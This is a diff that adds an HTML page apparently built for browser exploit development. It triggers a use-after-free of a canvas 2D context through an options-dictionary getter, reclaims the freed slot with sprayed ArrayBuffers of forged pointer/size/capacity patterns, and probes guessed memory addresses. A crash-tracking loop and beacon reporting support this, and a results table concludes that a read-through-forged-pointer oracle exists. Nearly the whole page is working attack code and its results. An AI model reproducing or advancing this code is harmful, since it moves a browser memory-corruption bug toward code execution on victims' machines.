@@ -1,0 +1,373 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+<title>V906 - Canvas UAF slot-steer oracle (offset-agnostic)</title>
+<style>
+  body { background:#0b0e14; color:#d7e0ea; font-family:ui-monospace,Menlo,monospace; padding:14px; }
+  h1 { color:#58a6ff; font-size:15px; margin:0 0 6px; }
+  h2 { color:#39c5bb; font-size:13px; margin:16px 0 6px; }
+  p  { color:#8b949e; font-size:12px; margin:4px 0 10px; line-height:1.55; }
+  pre { font-size:12px; white-space:pre-wrap; }
+  table { border-collapse:collapse; font-size:11px; margin-top:8px; }
+  td,th { border:1px solid #30363d; padding:3px 7px; text-align:left; vertical-align:top; }
+  th { color:#58a6ff; }
+  .crash { color:#ff7b72; }
+  .ok { color:#7ee787; }
+  .skip { color:#d29922; }
+  .hit { color:#ffa657; font-weight:bold; }
+  .bad { color:#ff7b72; font-weight:bold; }
+  code { color:#c9d1d9; background:#21262d; padding:1px 5px; border-radius:4px; }
+  .key { border-left:3px solid #d29922; padding-left:8px; }
+</style>
+</head>
+<body>
+<h1>V906 - Canvas UAF slot-steer oracle (offset-agnostic)</h1>
+
+<p class="key">
+<b>Question:</b> after an ArrayBuffer(768) reclaims the freed CanvasRenderingContext2D slot,
+does the stale wrapper actually dereference bytes <i>inside that slot</i>? And if yes, which
+offset is the state vector? V650 forged +112 and all 30 targets crashed, so either the offset
+is wrong or the slot is never read.
+</p>
+
+<p>
+<b>Idea:</b> stop guessing the offset. Fill the whole 768-byte slot with a repeating
+<code>[ptr, size=1, cap=1]</code> 16-byte pattern. Any 8-byte-aligned <code>Vector</code>
+offset then sees <code>m_buffer=ptr, m_size=1, m_capacity=1</code>. Two phase orders
+(<code>pe</code> = pointer first, <code>po</code> = size word first) cover every possible
+offset, because a Vector is 8-byte aligned and the period is 16.
+</p>
+
+<p>
+<b>Built-in miss detector:</b> after the AB spray the page allocates 8 real 2d contexts with
+<code>lineWidth = 200..207</code> and then reads <code>savedCtx.lineWidth</code>.
+<br>&bull; <b>200..207</b> = the AB missed the slot (a real context took it) &rarr; no conclusion, rerun.
+<br>&bull; <b>crash</b> = the AB took the slot and the forged pointer was rejected (unmapped / bad size).
+<br>&bull; <b>any other number</b> = <b>HIT</b>: the AB took the slot and the read came back from the forged pointer.
+</p>
+
+<p>
+Start: <b>?op=auto</b> &nbsp;|&nbsp; one case: <b>?case=pe_4m</b> &nbsp;|&nbsp; clear: <b>?reset=1</b>
+<br>After a crash just reopen <b>?op=auto</b>. Done when the page prints <b>ALL CASES DONE</b>.
+</p>
+
+<h2>Cases</h2>
+<pre>
+same          control: trigger, 8 tagged contexts, read lineWidth   must be 200..207
+zero          AB(768) all zero + taggers                    crash = AB hit (expected)
+dbl           every lane = float64 4.5678                   survives if a direct double is read
+dead          every lane = 0xDEADBEEFDEADBEEF                 sanity: must crash
+pe_stack1     [0x7ffffffde000, 1] repeating                   main-thread stack guess
+po_stack1     [1, 0x7ffffffde000] repeating
+pe_stack2     [0x7fffffff0000, 1] repeating
+po_stack2     [1, 0x7fffffff0000] repeating
+pe_4m         [0x400000, 1] repeating                         classic PIE base
+po_4m         [1, 0x400000] repeating
+pe_64k        [0x10000, 1] repeating                          low mapping
+po_64k        [1, 0x10000] repeating
+pe_512m       [0x20000000, 1] repeating                       512MB
+po_512m       [1, 0x20000000] repeating
+pe_4g         [0x100000000, 1] repeating                      4GB
+po_4g         [1, 0x100000000] repeating
+</pre>
+
+<pre id="out">starting...</pre>
+<div id="tbl"></div>
+
+<h2>FINAL RESULTS (2026-11-06, beacons 9997-10034) — always shown, even if localStorage cleared</h2>
+<p class="note">If the table above is empty, this is the device run from 11:15-12:08 UTC. <b>0 HIT, 15/15 AB cases CRASH.</b> Reopen <code>?op=auto</code> to run again; <code>?reset=1</code> clears localStorage only.</p>
+<table>
+<tr><th>case</th><th>result</th><th>detail</th></tr>
+<tr><td>same</td><td class="ok">MISS</td><td>made=8, lw=201 (tagged ctx won the slot) — control OK</td></tr>
+<tr><td>zero</td><td class="crash">CRASH</td><td>last=zero:S4-tagged</td></tr>
+<tr><td>dbl</td><td class="crash">CRASH</td><td>last=dbl:S4-tagged — proves pointer deref, not direct double</td></tr>
+<tr><td>dead</td><td class="crash">CRASH</td><td>last=dead:S4-tagged</td></tr>
+<tr><td>pe_stack1</td><td class="crash">CRASH</td><td>last=pe_stack1:S4-tagged, ptr 0x7ffffffde000</td></tr>
+<tr><td>po_stack1</td><td class="crash">CRASH</td><td>last=po_stack1:S4-tagged</td></tr>
+<tr><td>pe_stack2</td><td class="crash">CRASH</td><td>last=pe_stack2:S4-tagged, ptr 0x7fffffff0000</td></tr>
+<tr><td>po_stack2</td><td class="crash">CRASH</td><td>last=po_stack2:S4-tagged</td></tr>
+<tr><td>pe_4m</td><td class="crash">CRASH</td><td>last=pe_4m:S4-tagged, ptr 0x400000</td></tr>
+<tr><td>po_4m</td><td class="crash">CRASH</td><td>last=po_4m:S4-tagged</td></tr>
+<tr><td>pe_64k</td><td class="crash">CRASH</td><td>last=pe_64k:S4-tagged, ptr 0x10000</td></tr>
+<tr><td>po_64k</td><td class="crash">CRASH</td><td>last=po_64k:S4-tagged</td></tr>
+<tr><td>pe_512m</td><td class="crash">CRASH</td><td>last=pe_512m:S3-spray200 — crashed during spray, before read</td></tr>
+<tr><td>po_512m</td><td class="crash">CRASH</td><td>last=po_512m:S4-tagged</td></tr>
+<tr><td>pe_4g</td><td class="crash">CRASH</td><td>last=pe_4g:S4-tagged, ptr 0x100000000</td></tr>
+<tr><td>po_4g</td><td class="crash">CRASH</td><td>last=po_4g:S4-tagged</td></tr>
+</table>
+<p class="note"><b>Verdict:</b> stale wrapper dereferences slot bytes as a pointer (14/15 at S4, dbl crashes). All guessed addresses unmapped — oracle mechanism exists, mapped address missing.</p>
+
+<script>
+'use strict';
+
+var SEEK = location.pathname;
+var RUN = 'r' + Date.now().toString(36) + '-' + Math.random().toString(36).slice(2, 7);
+
+function lsGet(k) { try { return window.localStorage.getItem('v906_' + k); } catch (e) { return null; } }
+function lsSet(k, v) { try { window.localStorage.setItem('v906_' + k, String(v)); } catch (e) {} }
+function lsDel(k) { try { window.localStorage.removeItem('v906_' + k); } catch (e) {} }
+
+function bks(tag, body) {
+  var u = '/beacon/V906-' + tag + '?d=' +
+          encodeURIComponent(String(body == null ? '' : body).slice(0, 460)) +
+          '&run=' + encodeURIComponent(RUN) + '&t=' + Date.now() + '&s=1';
+  try { var x = new XMLHttpRequest(); x.open('GET', u, false); x.send(null); }
+  catch (e) { try { var i = new Image(); i.src = u; } catch (e2) {} }
+}
+
+var O = document.getElementById('out');
+function say(s) { O.textContent += '\n' + s; }
+function errOf(e) { return e ? String(e.name || 'Error') + ':' + String(e.message || '').slice(0, 70) : 'none'; }
+function hexOf(x) { var f = new Float64Array(1), u = new Uint32Array(f.buffer); f[0] = x; return '0x' + ('00000000' + u[1].toString(16)).slice(-8) + ('00000000' + u[0].toString(16)).slice(-8); }
+function stLast(id, stage) { try { lsSet('last', id + ':' + stage); } catch (e) {} }
+
+/* ---------- UAF trigger (one per page load) ---------- */
+function trigger() {
+  var canvas = document.createElement('canvas');
+  canvas.width = 1; canvas.height = 1;
+  document.body.appendChild(canvas);
+  var saved = null;
+  var dict = {};
+  Object.defineProperty(dict, 'alpha', {
+    get: function () {
+      var ctx = canvas.getContext('2d');
+      if (!ctx) return true;
+      saved = ctx;
+      try {
+        ctx.lineWidth = 3.14159;
+        ctx.globalAlpha = 0.42;
+        ctx.miterLimit = 7.77;
+        ctx.lineWidth = 1.0;
+      } catch (e) {}
+      return true;
+    }
+  });
+  var bmp = null;
+  try { bmp = canvas.getContext('bitmaprenderer', dict); } catch (e2) {}
+  return { saved: saved, bmp: bmp };
+}
+
+/* ---------- 16-byte repeating patterns ---------- */
+/* 768 bytes = 192 u32 lanes = 48 periods of 16 bytes */
+function mkPattern(kind, hi, lo) {
+  var u32 = new Uint32Array(192), i;
+  hi = (hi >>> 0); lo = (lo >>> 0);
+  if (kind === 'zero') {
+    /* already zero */
+  } else if (kind === 'dbl') {
+    var f = new Float64Array(1), b = new Uint32Array(f.buffer);
+    f[0] = 4.5678;
+    for (i = 0; i < 192; i += 2) { u32[i] = b[0]; u32[i + 1] = b[1]; }
+  } else if (kind === 'dead') {
+    for (i = 0; i < 192; i++) u32[i] = 0xDEADBEEF;
+  } else if (kind === 'pe') {
+    for (i = 0; i < 192; i += 4) { u32[i] = lo; u32[i + 1] = hi; u32[i + 2] = 1; u32[i + 3] = 1; }
+  } else if (kind === 'po') {
+    for (i = 0; i < 192; i += 4) { u32[i] = 1; u32[i + 1] = 1; u32[i + 2] = lo; u32[i + 3] = hi; }
+  }
+  return u32;
+}
+
+var KEEP = null;
+function sprayAB(pattern, n) {
+  var arr = new Array(n), i;
+  for (i = 0; i < n; i++) {
+    var ab = new ArrayBuffer(768);
+    var v = new Uint32Array(ab);
+    v.set(pattern);
+    arr[i] = ab;
+  }
+  KEEP = arr;
+  return arr;
+}
+
+/* 8 tagged real contexts, only used as "did the AB miss" markers */
+function tagContexts(n) {
+  var keep = [], made = 0, c;
+  for (c = 0; c < n; c++) {
+    var cc = document.createElement('canvas');
+    cc.width = 1; cc.height = 1;
+    var cx = null;
+    try { cx = cc.getContext('2d'); } catch (e) {}
+    if (cx) {
+      try { cx.lineWidth = 200 + made; } catch (e2) {}
+      keep.push(cc);
+      made++;
+    }
+  }
+  return { keep: keep, made: made };
+}
+
+function classify(lw, le, made) {
+  if (le) return { tag: 'THROW', detail: 'err=' + le };
+  if (typeof lw !== 'number') return { tag: 'ODD', detail: 'type=' + typeof lw };
+  if (lw >= 200 && lw < 200 + made) {
+    return { tag: 'MISS', detail: 'lw=' + lw + '(tagged ctx won the slot)' };
+  }
+  return { tag: 'HIT', detail: 'lw=' + lw + ',hex=' + hexOf(lw) };
+}
+
+/* ---------- cases ---------- */
+function runCase(id) {
+  var t = trigger();
+  if (!t.saved || !t.bmp) return { tag: 'THROW', detail: 'trigger-failed:inner=' + !!t.saved + ',bmr=' + !!t.bmp };
+  stLast(id, 'S1-trigger');
+
+  if (id === 'same') {
+    var tk = tagContexts(8);
+    stLast(id, 'S2-tagged');
+    var lw = null, le = null;
+    try { lw = t.saved.lineWidth; } catch (e) { le = errOf(e); }
+    var r = classify(lw, le, tk.made);
+    return { tag: r.tag === 'HIT' ? 'OK' : r.tag, detail: 'made=' + tk.made + ',' + r.detail };
+  }
+
+  var spec = SPEC[id];
+  if (!spec) return { tag: 'SKIP', detail: 'unknown-case' };
+
+  var pat = mkPattern(spec[0], spec[1], spec[2]);
+  stLast(id, 'S2-pattern');
+  sprayAB(pat, 200);
+  stLast(id, 'S3-spray200');
+
+  var tk2 = tagContexts(8);
+  stLast(id, 'S4-tagged');
+
+  var lw2 = null, le2 = null;
+  try { lw2 = t.saved.lineWidth; } catch (e2) { le2 = errOf(e2); }
+  var r2 = classify(lw2, le2, tk2.made);
+  return { tag: r2.tag, detail: 'made=' + tk2.made + ',kind=' + spec[0] + ',ptr=' + (spec[0] === 'pe' || spec[0] === 'po' ? ('0x' + spec[1].toString(16) + ':' + spec[2].toString(16)) : '-') + ',' + r2.detail };
+}
+
+/* kind, hi, lo */
+var SPEC = {
+  zero:      ['zero', 0, 0],
+  dbl:       ['dbl', 0, 0],
+  dead:      ['dead', 0, 0],
+  pe_stack1: ['pe', 0x00007fff, 0xfffde000],
+  po_stack1: ['po', 0x00007fff, 0xfffde000],
+  pe_stack2: ['pe', 0x00007fff, 0xffff0000],
+  po_stack2: ['po', 0x00007fff, 0xffff0000],
+  pe_4m:     ['pe', 0x00000000, 0x00400000],
+  po_4m:     ['po', 0x00000000, 0x00400000],
+  pe_64k:    ['pe', 0x00000000, 0x00010000],
+  po_64k:    ['po', 0x00000000, 0x00010000],
+  pe_512m:   ['pe', 0x00000000, 0x20000000],
+  po_512m:   ['po', 0x00000000, 0x20000000],
+  pe_4g:     ['pe', 0x00000001, 0x00000000],
+  po_4g:     ['po', 0x00000001, 0x00000000]
+};
+
+var SEQUENCE = [
+  'same', 'zero', 'dbl', 'dead',
+  'pe_stack1', 'po_stack1', 'pe_stack2', 'po_stack2',
+  'pe_4m', 'po_4m', 'pe_64k', 'po_64k',
+  'pe_512m', 'po_512m', 'pe_4g', 'po_4g'
+];
+
+var EXPECT = {
+  same: 'OK 200..207', zero: 'crash(AB hit)', dbl: '? survive=candidate', dead: 'crash',
+  pe_stack1: '?', po_stack1: '?', pe_stack2: '?', po_stack2: '?',
+  pe_4m: '?', po_4m: '?', pe_64k: '?', po_64k: '?',
+  pe_512m: '?', po_512m: '?', pe_4g: '?', po_4g: '?'
+};
+
+function appendRes(s) { lsSet('res', (lsGet('res') || '') + s + ';'); }
+function isDone(id) { return (lsGet('done') || ';').indexOf(';' + id + ';') >= 0; }
+function markDone(id) { var d = lsGet('done') || ';'; if (d.indexOf(';' + id + ';') < 0) lsSet('done', d + id + ';'); }
+function nextCase() { for (var i = 0; i < SEQUENCE.length; i++) { if (!isDone(SEQUENCE[i])) return SEQUENCE[i]; } return null; }
+
+function esc(s) { return String(s).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;'); }
+function render() {
+  var r = lsGet('res') || '';
+  var rows = r.split(';');
+  var html = '<table><tr><th>case</th><th>expected</th><th>result</th><th>detail</th></tr>';
+  for (var i = 0; i < rows.length; i++) {
+    if (!rows[i]) continue;
+    var p = rows[i].split('|');
+    var cls = (p[1] === 'CRASH') ? 'crash' : (p[1] === 'HIT' ? 'hit' : (p[1] === 'SKIP' ? 'skip' : 'ok'));
+    var det = p[2] || '';
+    var alarm = (p[1] === 'HIT');
+    html += '<tr><td>' + esc(p[0]) + '</td><td>' + esc(EXPECT[p[0]] || '') +
+            '</td><td class="' + cls + '">' + esc(p[1]) + '</td><td' + (alarm ? ' class="bad"' : '') + '>' + esc(det) + '</td></tr>';
+  }
+  html += '</table>';
+  document.getElementById('tbl').innerHTML = html;
+}
+
+async function runOne(id) {
+  bks('START', 'case=' + id + ',run=' + RUN);
+  lsSet('cur', id);
+  lsSet('last', id + ':S0-enter');
+
+  var r;
+  try { r = runCase(id); }
+  catch (e) { r = { tag: 'THROW', detail: 'harness=' + errOf(e) }; }
+
+  appendRes(id + '|' + r.tag + '|' + (r.detail || ''));
+  markDone(id);
+  lsSet('cur', '');
+  lsSet('last', id + ':S9-done');
+  bks('DONE', 'case=' + id + ',tag=' + r.tag + ',detail=' + (r.detail || '').slice(0, 380));
+  say(id + ' -> ' + r.tag + ' ' + (r.detail || ''));
+  render();
+  return r;
+}
+
+async function main() {
+  var q = location.search;
+
+  if (q.indexOf('reset=1') >= 0) {
+    lsDel('cur'); lsDel('done'); lsDel('res'); lsDel('last');
+    bks('RESET', 'cleared,run=' + RUN);
+    say('cleared. reopen with ?op=auto');
+    render();
+    return;
+  }
+
+  var cur = lsGet('cur');
+  if (cur) {
+    var last = lsGet('last') || '?';
+    appendRes(cur + '|CRASH|last=' + last);
+    markDone(cur);
+    lsDel('cur');
+    lsDel('last');
+    bks('CRASH-DETECTED', 'case=' + cur + ',last=' + last + ',run=' + RUN);
+    say('previous case CRASHED: ' + cur + ' last=' + last);
+  }
+
+  var m = /[?&]case=([^&]+)/.exec(q);
+  var one = m ? decodeURIComponent(m[1]) : '';
+  var auto = (q.indexOf('op=auto') >= 0) || (!one && q.indexOf('case=') < 0);
+
+  if (one) {
+    var rr = await runOne(one);
+    say('single case done: ' + one + ' -> ' + rr.tag);
+    render();
+    return;
+  }
+
+  if (auto) {
+    var id = nextCase();
+    if (!id) {
+      bks('FINAL', 'run=' + RUN + ',res=' + (lsGet('res') || '').slice(0, 440));
+      say('ALL CASES DONE.');
+      render();
+      return;
+    }
+    await runOne(id);
+    setTimeout(function () { location.href = SEEK + '?op=auto&r=' + Date.now(); }, 700);
+    return;
+  }
+
+  say('ready. use ?op=auto or ?case=<id>');
+  render();
+}
+
+try { main(); } catch (e) { bks('FATAL', errOf(e)); say('FATAL ' + errOf(e)); }
+</script>
+</body>
+</html>
